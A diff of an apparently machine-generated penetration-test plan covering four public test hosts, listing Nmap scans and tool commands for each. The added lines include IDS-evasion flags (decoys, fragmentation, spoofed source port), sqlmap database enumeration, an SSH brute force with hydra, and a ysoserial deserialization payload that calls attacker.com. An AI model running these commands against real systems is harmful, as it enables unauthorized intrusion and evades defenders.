@@ -1,5 +1,5 @@
 {
-  "overallStrategy": "The overall strategy involves tailoring Nmap scans and additional tool usage based on the asset's deployment environment (cloud vs. on-premise) and detected technologies. Cloud assets will use less aggressive Nmap flags to avoid detection, while on-premise assets will utilize evasion techniques. Specific NSE scripts and external tools like Nuclei, Nikto, and cloud_enum will be employed to target known vulnerabilities and configurations for the identified technologies.",
+  "overallStrategy": "The overall strategy involves a multi-phase approach. Phase A focuses on initial Nmap discovery, including service version detection and OS fingerprinting. Phase B utilizes Nmap Scripting Engine (NSE) for deeper vulnerability checks specific to detected technologies and common web vulnerabilities. Phase C incorporates active tools like Nuclei, Nikto, and specialized cloud tools for more in-depth vulnerability assessment, focusing on OWASP Top 10 categories. Evasion techniques are tailored based on whether the target is cloud-hosted or on-premise, with cloud targets having restricted evasion to avoid detection, while on-premise targets utilize more aggressive evasion. Specific attention is paid to KEV catalog items and OWASP Top 10 coverage for all targets.",
   "assetPlans": [
     {
       "hostname": "testphp.vulnweb.com",
@@ -7,10 +7,11 @@
         "PHP",
         "nginx",
         "MySQL",
-        "Ubuntu"
+        "Ubuntu",
+        "AWS"
       ],
-      "discoveryNmapFlags": "-Pn -sV -sC -p 80,443",
-      "discoveryNmapRationale": "This is an AWS target, so '-Pn -sV -sC' is used for stealth. Specific ports 80 and 443 are targeted based on web services. '-sC' includes default scripts.",
+      "discoveryNmapFlags": "-Pn -sV -sC -O",
+      "discoveryNmapRationale": "As an AWS target, '-Pn' is used to skip host discovery, '-sV' for service version detection, and '-sC' for default scripts. '-O' is included for OS detection. Evasion flags are restricted for cloud targets.",
       "nmapScripts": [
         "http-vuln-cve2012-1823",
         "http-phpself-xss",
@@ -20,102 +21,139 @@
         "ssl-enum-ciphers",
         "http-git",
         "http-cors",
-        "http-phpmyadmin-dir-traversal",
-        "http-phpmyadmin-version"
+        "http-robots.txt",
+        "http-sitemap-generator"
       ],
-      "nmapScriptRationale": "PHP-specific scripts are included due to 'X-Powered-By: PHP/5.6.40'. General web scripts are added for comprehensive web security checks, including SSL/TLS, headers, and CORS. 'http-git' is specifically for the '.git exposed' finding. phpMyAdmin scripts are included due to 'phpMyAdmin found'.",
+      "nmapScriptRationale": "PHP-specific scripts are included due to the 'X-Powered-By: PHP' header. General web scripts cover security headers, SSL/TLS, CORS, and common file enumeration (robots.txt, sitemap). 'http-git' is included due to the finding of a '.git' exposed. 'http-sql-injection' is relevant given the finding.",
       "activeTools": [
         {
           "tool": "nuclei",
-          "command": "nuclei -u testphp.vulnweb.com -tags php,sqli,git,misconfig,web,nginx,cve",
-          "rationale": "Nuclei is used to find known vulnerabilities related to PHP, SQL injection, exposed Git repositories, and general web misconfigurations, including specific CVEs. It is also used for general web and Nginx checks."
+          "command": "nuclei -u testphp.vulnweb.com -tags cloud,s3,misconfig,sqli,xss,ssti,idor,default-login,git,php,nginx -kev -o nuclei_testphp.vulnweb.com.txt",
+          "rationale": "Nuclei is used for comprehensive vulnerability scanning, including cloud misconfigurations, SQLi, XSS, SSTI, IDOR, default credentials, and specific tags for PHP, Nginx, and exposed Git. KEV checks are included. This covers A01, A03, A05, A06, A10."
+        },
+        {
+          "tool": "cloud_enum",
+          "command": "cloud_enum -k testphp.vulnweb.com -l cloud_enum_testphp.vulnweb.com.txt",
+          "rationale": "Mandatory for AWS targets to enumerate cloud resources and misconfigurations, covering A05 and A10."
+        },
+        {
+          "tool": "s3scanner",
+          "command": "s3scanner --buckets testphp.vulnweb.com --output s3scanner_testphp.vulnweb.com.txt",
+          "rationale": "Mandatory for AWS targets to identify and scan S3 buckets, covering A05 and A10."
         },
         {
           "tool": "nikto",
-          "command": "nikto -h testphp.vulnweb.com",
-          "rationale": "Nikto performs comprehensive web server scanning for known vulnerabilities, misconfigurations, and outdated software. It's a good general-purpose web scanner."
+          "command": "nikto -h testphp.vulnweb.com -o nikto_testphp.vulnweb.com.txt",
+          "rationale": "Nikto provides a broad scan for common web server vulnerabilities, misconfigurations, and outdated software, complementing Nmap and Nuclei. Covers A05, A06."
         },
         {
           "tool": "sqlmap",
-          "command": "sqlmap -u \"http://testphp.vulnweb.com/search.php?test=query\" --batch --risk=3 --level=5",
-          "rationale": "Given the finding of 'SQL injection in /search.php', sqlmap is the primary tool for exploiting and further enumerating SQL injection vulnerabilities."
+          "command": "sqlmap -u \"http://testphp.vulnweb.com/search.php?test=query\" --batch --risk=3 --level=5 --dbs --output sqlmap_testphp.vulnweb.com.txt",
+          "rationale": "Targeted SQL injection testing on the identified vulnerable endpoint, covering A03 Injection."
+        },
+        {
+          "tool": "dirbuster",
+          "command": "dirbuster -u http://testphp.vulnweb.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o dirbuster_testphp.vulnweb.com.txt",
+          "rationale": "Used for brute-forcing directories and files to discover hidden content, including phpMyAdmin, covering A05."
         }
       ],
-      "evasionProfile": "Cloud (AWS): No evasion flags allowed. Standard Nmap options for stealth in cloud environments.",
-      "riskNotes": "PHP 5.6.40 is end-of-life and highly vulnerable. SQL injection and exposed .git repository are critical findings. phpMyAdmin presence is a high-risk factor."
+      "evasionProfile": "Cloud (AWS) - Restricted",
+      "riskNotes": "High risk due to identified SQL injection and exposed .git repository. PHP/5.6.40 is very old and likely vulnerable. The presence of phpMyAdmin further increases the attack surface. AWS hosting implies potential for SSRF and cloud misconfiguration vulnerabilities."
     },
     {
       "hostname": "demo.testfire.net",
       "detectedTechnologies": [
         "Apache Tomcat",
         "Java",
-        "JSP"
+        "JSP",
+        "On-premise"
       ],
-      "discoveryNmapFlags": "-Pn -sV -sC -f -D RND:3 --source-port 53 -T2 -p 80,443,8080",
-      "discoveryNmapRationale": "This is an on-premise target, allowing for evasion techniques like '-f' (fragment packets), '-D RND:3' (decoy scan), '--source-port 53' (spoof source port), and '-T2' (slow scan). '-Pn -sV -sC' are standard for service detection and default scripts. Common Tomcat ports 80, 443, and 8080 are specified.",
+      "discoveryNmapFlags": "-sS -sV -sC -O -f -D RND:3 --source-port 53 -T2",
+      "discoveryNmapRationale": "As an on-premise target, aggressive evasion is used: '-sS' for stealth SYN scan, '-sV' for version detection, '-sC' for default scripts, and '-O' for OS detection. Evasion flags include '-f' for tiny fragmented packets, '-D RND:3' for decoy scans, '--source-port 53' to mimic DNS traffic, and '-T2' for a slower, more evasive scan.",
       "nmapScripts": [
         "http-vuln-cve2017-5638",
         "http-default-accounts",
         "http-security-headers",
         "ssl-enum-ciphers",
-        "http-git",
-        "http-cors",
-        "http-enum"
+        "http-enum",
+        "http-robots.txt",
+        "http-sitemap-generator"
       ],
-      "nmapScriptRationale": "Apache Tomcat specific scripts are included, notably 'http-vuln-cve2017-5638' (Struts RCE) due to Tomcat/Java environment, and 'http-default-accounts' for the 'default creds suspected' finding. General web security scripts are also included.",
+      "nmapScriptRationale": "Apache Tomcat specific scripts are included. 'http-vuln-cve2017-5638' is critical as it's a KEV item. 'http-default-accounts' is relevant due to suspected default credentials. General web scripts cover security headers, SSL/TLS, and common file enumeration.",
       "activeTools": [
         {
           "tool": "nuclei",
-          "command": "nuclei -u demo.testfire.net -tags tomcat,java,misconfig,web,cve",
-          "rationale": "Nuclei is used to find known vulnerabilities and misconfigurations related to Apache Tomcat, Java applications, and general web issues. It will specifically check for CVE-2017-5638."
+          "command": "nuclei -u demo.testfire.net -tags misconfig,default-login,java,tomcat,kev -o nuclei_demo.testfire.net.txt",
+          "rationale": "Nuclei targets misconfigurations, default logins, Java/Tomcat specific vulnerabilities, and checks for KEV items like CVE-2017-5638. Covers A05, A06."
         },
         {
           "tool": "nikto",
-          "command": "nikto -h demo.testfire.net",
-          "rationale": "Nikto provides a broad scan for common web server vulnerabilities, including those relevant to Tomcat and JSP applications."
+          "command": "nikto -h demo.testfire.net -o nikto_demo.testfire.net.txt",
+          "rationale": "Nikto scans for common web server vulnerabilities, misconfigurations, and outdated software, which is crucial for a banking application. Covers A05, A06."
         },
         {
-          "tool": "burpsuite_pro",
-          "command": "Manual testing via Burp Suite Pro for banking application logic flaws, authentication bypasses, and fund transfer vulnerabilities.",
-          "rationale": "Given it's a banking application with 'fund transfer' functionality and suspected 'default creds', manual testing with Burp Suite is essential for deeper logic and authentication flaws beyond automated tools."
+          "tool": "feroxbuster",
+          "command": "feroxbuster -u http://demo.testfire.net -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x jsp,do,action,xml -o feroxbuster_demo.testfire.net.txt",
+          "rationale": "Directory and file brute-forcing, specifically looking for JSP and Java-related endpoints to find sensitive pages or misconfigurations, covering A01 and A05."
+        },
+        {
+          "tool": "burpsuite_manual",
+          "command": "Manual testing with Burp Suite for authentication bypass, IDOR, and business logic flaws related to fund transfers.",
+          "rationale": "Given it's a banking app with suspected default creds and fund transfer functionality, manual testing with Burp Suite is essential to identify complex business logic flaws and access control issues (A01), and potential injection points (A03)."
+        },
+        {
+          "tool": "ysoserial",
+          "command": "ysoserial -g CommonsCollections5 -o payload.ser 'curl http://attacker.com/callback'",
+          "rationale": "If deserialization vulnerabilities are found in the Java application, ysoserial can be used to generate malicious payloads to test for A08 Integrity Failures."
         }
       ],
-      "evasionProfile": "On-premise: Aggressive evasion with packet fragmentation, decoy scans, source port spoofing, and slower timing.",
-      "riskNotes": "CVE-2017-5638 (Struts RCE) is a critical, actively exploited vulnerability. Default credentials and banking application logic flaws are high-risk findings requiring thorough manual investigation."
+      "evasionProfile": "On-premise - Aggressive",
+      "riskNotes": "High risk. The Apache Tomcat server might be running outdated versions, especially with CVE-2017-5638 being a KEV item. A banking application with suspected default credentials and fund transfer functionality is a critical target for access control (A01) and injection (A03) vulnerabilities. Java deserialization (A08) is a potential concern."
     },
     {
       "hostname": "scanme.nmap.org",
       "detectedTechnologies": [
+        "OpenSSH",
         "Apache",
         "Ubuntu",
-        "OpenSSH"
+        "On-premise"
       ],
-      "discoveryNmapFlags": "-Pn -sV -sC -f -D RND:3 --source-port 53 -T2 -p 22,80,9929,31337",
-      "discoveryNmapRationale": "This is an on-premise target, allowing for evasion techniques like '-f', '-D RND:3', '--source-port 53', and '-T2'. '-Pn -sV -sC' are standard for service detection and default scripts. All known open ports are specified.",
+      "discoveryNmapFlags": "-sS -sV -sC -O -f -D RND:3 --source-port 53 -T2",
+      "discoveryNmapRationale": "As an on-premise target, aggressive evasion is used: '-sS' for stealth SYN scan, '-sV' for version detection, '-sC' for default scripts, and '-O' for OS detection. Evasion flags include '-f' for tiny fragmented packets, '-D RND:3' for decoy scans, '--source-port 53' to mimic DNS traffic, and '-T2' for a slower, more evasive scan.",
       "nmapScripts": [
         "ssh2-enum-algos",
         "ssh-auth-methods",
         "http-security-headers",
         "ssl-enum-ciphers",
-        "http-git",
-        "http-cors",
-        "http-enum"
+        "http-enum",
+        "http-robots.txt",
+        "http-sitemap-generator"
       ],
-      "nmapScriptRationale": "OpenSSH-specific scripts are included to enumerate algorithms and authentication methods. General web scripts are added for the Apache web server.",
+      "nmapScriptRationale": "OpenSSH specific scripts are included to enumerate algorithms and authentication methods. General web scripts cover security headers, SSL/TLS, and common file enumeration for the Apache web server.",
       "activeTools": [
         {
           "tool": "nuclei",
-          "command": "nuclei -u scanme.nmap.org -tags ssh,apache,misconfig,web,cve",
-          "rationale": "Nuclei will check for known vulnerabilities and misconfigurations in OpenSSH and Apache, as well as general web issues."
+          "command": "nuclei -u scanme.nmap.org -tags misconfig,default-login,apache,ssh -o nuclei_scanme.nmap.org.txt",
+          "rationale": "Nuclei is used for general vulnerability scanning, including misconfigurations, default logins, and specific checks for Apache and SSH. Covers A05, A06."
         },
         {
           "tool": "nikto",
-          "command": "nikto -h scanme.nmap.org",
-          "rationale": "Nikto is used for a general web server scan against Apache to identify common vulnerabilities and misconfigurations."
+          "command": "nikto -h scanme.nmap.org -o nikto_scanme.nmap.org.txt",
+          "rationale": "Nikto scans for common web server vulnerabilities and misconfigurations on the Apache server. Covers A05, A06."
+        },
+        {
+          "tool": "hydra",
+          "command": "hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt ssh://scanme.nmap.org -o hydra_ssh_scanme.nmap.org.txt",
+          "rationale": "Brute-force SSH credentials to test for weak passwords or default accounts, covering A05."
+        },
+        {
+          "tool": "gobuster",
+          "command": "gobuster dir -u http://scanme.nmap.org -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster_scanme.nmap.org.txt",
+          "rationale": "Used for directory and file brute-forcing to discover hidden content on the Apache web server, covering A05."
         }
       ],
-      "evasionProfile": "On-premise: Aggressive evasion with packet fragmentation, decoy scans, source port spoofing, and slower timing.",
-      "riskNotes": "OpenSSH 6.6.1 is an older version and may have known vulnerabilities. Regular patching and secure configuration are important for SSH services."
+      "evasionProfile": "On-premise - Aggressive",
+      "riskNotes": "Moderate risk. OpenSSH 6.6.1 is an older version and might have known vulnerabilities (A06). Apache 2.4.7 is also dated. The presence of non-standard ports (9929, 31337) could indicate custom services or honeypots, requiring further investigation. Focus on misconfigurations (A05) and vulnerable components (A06)."
     },
     {
       "hostname": "testasp.vulnweb.com",
@@ -123,35 +161,56 @@
         "IIS",
         "ASP.NET",
         "MSSQL",
-        "Windows Server"
+        "Windows Server",
+        "AWS"
       ],
-      "discoveryNmapFlags": "-Pn -sV -sC -p 80,443",
-      "discoveryNmapRationale": "This is an AWS target, so '-Pn -sV -sC' is used for stealth. Specific ports 80 and 443 are targeted based on web services. '-sC' includes default scripts.",
+      "discoveryNmapFlags": "-Pn -sV -sC -O",
+      "discoveryNmapRationale": "As an AWS target, '-Pn' is used to skip host discovery, '-sV' for service version detection, and '-sC' for default scripts. '-O' is included for OS detection. Evasion flags are restricted for cloud targets.",
       "nmapScripts": [
         "http-aspnet-debug",
         "http-iis-webdav-vuln",
         "http-vuln-cve2015-1635",
         "http-security-headers",
         "ssl-enum-ciphers",
-        "http-git",
-        "http-cors",
-        "http-enum"
+        "http-enum",
+        "http-robots.txt",
+        "http-sitemap-generator"
       ],
-      "nmapScriptRationale": "IIS/ASP.NET specific scripts are included due to the identified technologies. 'http-aspnet-debug' and 'http-iis-webdav-vuln' are directly related to the findings ('Debug mode enabled', 'WebDAV accessible'). 'http-vuln-cve2015-1635' is a critical, actively exploited vulnerability for HTTP.sys. General web scripts are also included.",
+      "nmapScriptRationale": "IIS/ASP.NET specific scripts are included. 'http-aspnet-debug' is crucial due to the 'debug mode enabled' finding. 'http-iis-webdav-vuln' is included as WebDAV is accessible. 'http-vuln-cve2015-1635' is a KEV item. General web scripts cover security headers, SSL/TLS, and common file enumeration.",
       "activeTools": [
         {
           "tool": "nuclei",
-          "command": "nuclei -u testasp.vulnweb.com -tags iis,aspnet,webdav,misconfig,cve,web",
-          "rationale": "Nuclei is used to find known vulnerabilities and misconfigurations related to IIS, ASP.NET, WebDAV, and general web issues. It will specifically check for CVE-2015-1635."
+          "command": "nuclei -u testasp.vulnweb.com -tags cloud,s3,misconfig,aspnet,iis,kev -o nuclei_testasp.vulnweb.com.txt",
+          "rationale": "Nuclei is used for comprehensive vulnerability scanning, including cloud misconfigurations, ASP.NET/IIS specific checks, and KEV items like CVE-2015-1635. Covers A05, A06, A10."
+        },
+        {
+          "tool": "cloud_enum",
+          "command": "cloud_enum -k testasp.vulnweb.com -l cloud_enum_testasp.vulnweb.com.txt",
+          "rationale": "Mandatory for AWS targets to enumerate cloud resources and misconfigurations, covering A05 and A10."
+        },
+        {
+          "tool": "s3scanner",
+          "command": "s3scanner --buckets testasp.vulnweb.com --output s3scanner_testasp.vulnweb.com.txt",
+          "rationale": "Mandatory for AWS targets to identify and scan S3 buckets, covering A05 and A10."
         },
         {
           "tool": "nikto",
-          "command": "nikto -h testasp.vulnweb.com",
-          "rationale": "Nikto performs comprehensive web server scanning for known vulnerabilities, misconfigurations, and outdated software, which is relevant for IIS/ASP.NET."
+          "command": "nikto -h testasp.vulnweb.com -o nikto_testasp.vulnweb.com.txt",
+          "rationale": "Nikto provides a broad scan for common web server vulnerabilities, misconfigurations, and outdated software, which is important for IIS. Covers A05, A06."
+        },
+        {
+          "tool": "dirbuster",
+          "command": "dirbuster -u http://testasp.vulnweb.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x asp,aspx,config,bak -o dirbuster_testasp.vulnweb.com.txt",
+          "rationale": "Used for brute-forcing directories and files, specifically targeting ASP.NET related extensions to find sensitive files or debug endpoints, covering A05."
+        },
+        {
+          "tool": "burpsuite_manual",
+          "command": "Manual testing with Burp Suite for WebDAV vulnerabilities, debug endpoint exploitation, and potential SQL injection in ASP.NET applications.",
+          "rationale": "Given the 'debug mode enabled' and 'WebDAV accessible' findings, manual testing is crucial to exploit these. This covers A03 (Injection) and A05 (Security Misconfiguration)."
         }
       ],
-      "evasionProfile": "Cloud (AWS): No evasion flags allowed. Standard Nmap options for stealth in cloud environments.",
-      "riskNotes": "CVE-2015-1635 (HTTP.sys RCE) is a critical, actively exploited vulnerability. Debug mode enabled and accessible WebDAV are significant security risks, potentially leading to information disclosure or remote code execution."
+      "evasionProfile": "Cloud (AWS) - Restricted",
+      "riskNotes": "High risk. 'Debug mode enabled' is a critical misconfiguration (A05) that can lead to information disclosure or code execution. Accessible WebDAV is a common vector for file uploads and server compromise. CVE-2015-1635 (HTTP.sys) is a KEV item. AWS hosting implies potential for SSRF and cloud misconfiguration vulnerabilities."
     }
   ]
 }
